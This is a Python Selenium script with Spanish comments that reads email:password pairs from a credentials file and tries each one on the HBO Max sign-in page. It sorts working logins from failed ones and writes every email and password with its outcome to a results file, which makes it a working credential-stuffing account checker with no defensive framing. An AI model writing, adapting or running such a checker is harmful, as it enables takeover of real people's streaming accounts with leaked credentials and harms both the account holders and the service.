from selenium.webdriver import Chrome
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

# URL de la página web de HBO Max
url_pagina_web_hbo = "https://play.hbomax.com/signIn"

# Ruta del archivo que contiene correos y contraseñas
ruta_archivo_credenciales = "CREDENCIALES_HBO.txt"

# Ruta del archivo de resultados
ruta_archivo_resultados = "resultados_hbo.txt"

# Configuración del navegador (puedes cambiar el navegador si lo deseas)

# Abrir el archivo de resultados en modo escritura con la codificación utf-8
with open(ruta_archivo_resultados, "w", encoding="utf-8") as archivo_resultados:
    # Leer el contenido del archivo de credenciales
    with open(ruta_archivo_credenciales, "r") as archivo_credenciales:
        lineas = archivo_credenciales.readlines()

    # Iterar sobre las líneas del archivo
    for linea in lineas:
        # Dividir la línea en correo y contraseña
        correo, contrasena = linea.strip().split(":")

        # Configuración del navegador para cada cuenta
        driver = Chrome()

        try:
            # Abrir la página web de HBO Max
            driver.get(url_pagina_web_hbo)

            # Esperar hasta que el campo de correo esté presente en la página
            elemento_correo = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "EmailTextInput"))
            )

            # Limpiar el campo de correo
            elemento_correo.clear()

            # Escribir el correo en el campo de correo electrónico
            elemento_correo.send_keys(correo)

            # Encontrar el elemento de contraseña
            elemento_contrasena = driver.find_element(By.ID, "PasswordTextInput")

            # Limpiar el campo de contraseña
            elemento_contrasena.clear()

            # Escribir la contraseña en el campo de contraseña
            elemento_contrasena.send_keys(contrasena)

            # Puedes enviar el formulario presionando la tecla Enter
            elemento_contrasena.send_keys(Keys.ENTER)

            # Esperar unos segundos antes de pasar al siguiente conjunto de credenciales
            time.sleep(5)

            # Verificar si se ha iniciado sesión o si hay un mensaje de error específico
            mensaje_error_presente = "La dirección de e-mail o la contraseña es incorrecta. Vuelve a intentarlo." in driver.page_source

            if mensaje_error_presente:
                resultado = f"Fallo: {correo} - Contraseña: {contrasena}. Mensaje de error: La dirección de e-mail o la contraseña es incorrecta. Vuelve a intentarlo.\n"
            else:
                resultado = f"Éxito: {correo} - Contraseña: {contrasena}. Inicio de sesión correcto.\n"

            # Imprimir el resultado en la terminal
            print(resultado)

            # Escribir el resultado en el archivo de resultados
            archivo_resultados.write(resultado)

        except Exception as e:
            # Omitir mensajes de error en el archivo de resultados
            pass

        finally:
            # Cerrar el navegador al finalizar la prueba para esta cuenta
            driver.quit()

# Importante: Deberías cerrar el navegador manualmente cuando hayas terminado todas las pruebas.
